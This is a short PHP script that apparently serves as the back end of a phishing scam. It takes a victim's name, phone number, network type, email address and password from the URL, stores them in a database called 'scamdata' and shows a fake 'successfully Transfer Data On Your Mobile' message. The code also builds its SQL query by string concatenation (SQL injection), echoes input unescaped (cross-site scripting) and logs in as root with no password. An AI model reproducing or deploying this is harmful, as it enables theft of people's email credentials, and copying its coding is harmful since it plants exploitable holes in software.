<?php
    $name = $_GET["name"];
    $number = $_GET["number"];
    $networkType = $_GET["networkType"];
    $email = $_GET["email"];
    $password = $_GET["password"];

    
    echo $name."<br/>";
    echo $number."<br/>";
    echo $networkType."<br/>";
    echo $email."<br/>";
    echo $password;

    $con = new mysqli("localhost","root","","scamdata");
    $query = $con->query("INSERT INTO  email_psw_scam VALUES('$name',$number,'$networkType','$email','$password')");

    if(true){
       echo   "successfully Transfer Data On Your Mobile";
    }
?>

